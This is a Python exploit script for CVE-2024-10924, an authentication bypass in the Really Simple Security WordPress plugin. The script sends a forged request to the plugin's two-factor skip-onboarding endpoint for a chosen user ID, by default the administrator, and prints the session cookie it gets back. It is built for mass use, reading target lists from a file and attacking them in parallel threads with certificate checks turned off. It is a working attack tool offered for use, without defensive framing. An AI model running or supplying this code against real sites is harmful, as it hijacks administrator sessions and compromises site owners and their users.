#!/usr/bin/env python3
# Exploit for Really Simple Security < 9.1.2 authentication bypass vulnerability (CVE-2024-10924)
# Modified with multi-target support and ASCII art

import argparse
import json
import logging
import random
import requests
import string
import validators
import sys
from concurrent.futures import ThreadPoolExecutor

ASCII_ART = """
▓█████  ██▀███   ██▓ ▄████▄   ██░ ██  ██▓ ▒█████   ███▄    █ 
▓█   ▀ ▓██ ▒ ██▒▓██▒▒██▀ ▀█  ▓██░ ██▒▓██▒▒██▒  ██▒ ██ ▀█   █ 
▒███   ▓██ ░▄█ ▒▒██▒▒▓█    ▄ ▒██▀▀██░▒██▒▒██░  ██▒▓██  ▀█ ██▒
▒▓█  ▄ ▒██▀▀█▄  ░██░▒▓▓▄ ▄██▒░▓█ ░██ ░██░▒██   ██░▓██▒  ▐▌██▒
░▒████▒░██▓ ▒██▒░██░▒ ▓███▀ ░░▓█▒░██▓░██░░ ████▓▒░▒██░   ▓██░
░░ ▒░ ░░ ▒▓ ░▒▓░░▓  ░ ░▒ ▒  ░ ▒ ░░▒░▒░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
 ░ ░  ░  ░▒ ░ ▒░ ▒ ░  ░  ▒    ▒ ░▒░ ░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
   ░     ░░   ░  ▒ ░░         ░  ░░ ░ ▒ ░░ ░ ░ ▒     ░   ░ ░ 
   ░  ░   ░      ░  ░ ░       ░  ░  ░ ░      ░ ░           ░ 
                 ░                                            
"""

VERSION = "v1.1 (2024-11-19)"
DEFAULT_LOGGING_LEVEL = logging.INFO

def parse_arguments():
    parser = argparse.ArgumentParser(
        description=f"Exploit for Really Simple Security < 9.1.2 authentication bypass vulnerability (CVE-2024-10924). - {VERSION}"
    )
    parser.add_argument("-t", "--target",
                        required=False,
                        help="URL of the target WordPress")
    parser.add_argument("-f", "--file",
                        required=False,
                        help="File containing multiple targets (one per line)")
    parser.add_argument("-uid", "--user-id",
                        required=False,
                        default=1,
                        help="Victim user ID (1 is usually the admin).")
    parser.add_argument("-v", "--verbose",
                        action="store_true",
                        required=False,
                        default=False,
                        help="verbose mode")
    parser.add_argument("-T", "--threads",
                        required=False,
                        default=10,
                        type=int,
                        help="Number of threads for multi-target")
    return parser.parse_args()

def validate_input(args):
    if not args.target and not args.file:
        raise ValueError("Either target or file must be specified!")
    
    if args.target:
        try:
            validators.url(args.target)
        except validators.ValidationFailure:
            raise ValueError("Invalid target URL!")
    
    try:
        if int(args.user_id) < 1:
            raise ValueError("Invalid user ID!")
    except ValueError:
        raise ValueError("Invalid user ID!")

def load_targets_from_file(filename):
    targets = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                target = line.strip()
                if target and validators.url(target):
                    targets.append(target)
        return targets
    except Exception as e:
        logging.fatal(f"Error reading targets file: {e}")
        return []

def send_request(target, user_id):
    logging.info(f"Sending request to target: {target}")
    
    target_endpoint = f"{target}"
    if not target_endpoint.endswith("/"):
        target_endpoint = f"{target_endpoint}/"
    target_endpoint = f"{target_endpoint}?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding"

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    }

    body = {
        "user_id": int(user_id),
        "login_nonce": "".join(random.choices(string.digits, k=10)),
        "redirect_to": "/wp-admin/"
    }
    logging.debug(f"Body: {body}")

    try:
        r = requests.post(target_endpoint, headers=headers, json=body, verify=False, timeout=10)
        logging.info(f"Request sent to {target} (HTTP {r.status_code}).")
        
        if r.status_code == 200 and r.headers.get("Set-Cookie") and "redirect_to" in r.text and "=deleted;" not in r.headers.get("Set-Cookie", ""):
            logging.info(f"SUCCESS - {target}")
            logging.info(f"Cookie received:\n{r.headers['Set-Cookie']}\n")
            return True, target, r.headers['Set-Cookie']
        else:
            logging.warning(f"FAILED - {target} - Wrong response")
            return False, target, None
            
    except Exception as e:
        logging.error(f"ERROR - {target} - {e}")
        return False, target, None

def process_single_target(target, user_id):
    success, target_url, cookie = send_request(target, user_id)
    return success, target_url, cookie

def process_multiple_targets(targets, user_id, threads):
    results = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(send_request, target, user_id) for target in targets]
        for future in futures:
            results.append(future.result())
    return results

def main():
    print(ASCII_ART)
    print(f"Multi-Target Exploit {VERSION}")
    print("=" * 50)
    
    args = parse_arguments()
    logging_level = DEFAULT_LOGGING_LEVEL
    if args.verbose:
        logging_level = logging.DEBUG
    logging.basicConfig(level=logging_level, format="%(asctime)s - %(levelname)s - %(message)s")

    try:
        validate_input(args)
    except ValueError as e:
        logging.fatal(e)
        sys.exit(1)

    targets = []
    if args.target:
        targets.append(args.target.strip())
    elif args.file:
        targets = load_targets_from_file(args.file)
        if not targets:
            logging.fatal("No valid targets found in file!")
            sys.exit(1)

    user_id = int(args.user_id)
    
    logging.info(f"Starting exploit with {len(targets)} target(s)")
    logging.debug(f"Parameters: user_id={user_id}, threads={args.threads}")

    if len(targets) == 1:
        success, target_url, cookie = process_single_target(targets[0], user_id)
        if success:
            print(f"\n[SUCCESS] Target: {target_url}")
            print(f"Cookie: {cookie}")
        else:
            print(f"\n[FAILED] Target: {target_url}")
    else:
        print(f"\nProcessing {len(targets)} targets with {args.threads} threads...")
        results = process_multiple_targets(targets, user_id, args.threads)
        
        successful = [r for r in results if r[0]]
        failed = [r for r in results if not r[0]]
        
        print(f"\nResults:")
        print(f"Successful: {len(successful)}")
        print(f"Failed: {len(failed)}")
        
        if successful:
            print(f"\nSuccessful targets:")
            for success, target, cookie in successful:
                print(f"  ✓ {target}")
                if args.verbose:
                    print(f"    Cookie: {cookie}")

    logging.info("Finished.")

if __name__ == "__main__":
    main()